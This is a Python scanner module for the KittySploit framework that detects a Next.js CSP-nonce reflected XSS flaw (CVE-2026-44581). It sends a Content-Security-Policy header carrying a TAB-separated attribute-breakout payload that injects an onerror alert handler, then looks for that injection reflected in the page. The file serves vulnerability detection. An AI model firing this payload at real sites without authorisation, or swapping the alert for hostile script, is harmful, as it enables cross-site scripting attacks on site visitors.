#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Next.js CSP-nonce reflected XSS (CVE-2026-44581) — detect",
        "description": (
            "GET with malicious Content-Security-Policy nonce (TAB-separated breakout); "
            "matches reflected nonce="" onerror=… in body or &quot; / missing nonce=."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-44581",
        "references": ["https://github.com/advisories/GHSA-ffhc-5mcf-pf4q"],
        "tags": ["scanner", "http", "nextjs", "xss", "csp"],
    }

    validation_token = OptString("VALIDATION_TOKEN", "Token in alert() and needle", required=False)

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _url(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        path = str(self.path).strip() or "/"
        if not path.startswith("/"):
            path = "/" + path
        return f"{proto}://{t}:{p}{path}"

    def _csp_and_needle(self):
        tok = str(self._o(self.validation_token) or "VALIDATION_TOKEN").strip() or "VALIDATION_TOKEN"
        if "'" in tok or "\n" in tok or "\r" in tok:
            tok = "VALIDATION_TOKEN"
        inner = '"\tonerror="alert(\'' + tok + '\')'
        csp = "script-src 'nonce-" + inner + "'"
        needle = "nonce=\"\" onerror=\"alert('" + tok + "')\""
        return csp, needle

    def _get_with_csp(self):
        url = self._url()
        csp, _ = self._csp_and_needle()
        hdr = {"Content-Security-Policy": csp}
        try:
            r = self.get(url, headers=hdr, timeout=float(self._o(self.timeout)))
            return r.status_code, r.text, None
        except Exception as e:
            return -1, "", str(e)
        finally:
            for k in hdr:
                self.session.headers.pop(k, None)

    @staticmethod
    def _classify(body: str, needle: str) -> str:
        if needle in body:
            return "vulnerable"
        if "&quot;" in body:
            return "patched"
        if "nonce=" not in body:
            return "patched"
        return "inconclusive"

    def run(self):
        _, needle = self._csp_and_needle()
        code, body, err = self._get_with_csp()
        if err:
            self.set_info(reason=err)
            return False
        if code != 200:
            self.set_info(reason=f"HTTP {code}")
            return False
        v = self._classify(body, needle)
        if v == "vulnerable":
            self.set_info(reason="nonce attribute breakout", confidence="high")
            return True
        if v == "patched":
            self.set_info(reason="escaped or nonce dropped", confidence="high")
            return False
        self.set_info(reason="inconclusive", confidence="low")
        return False
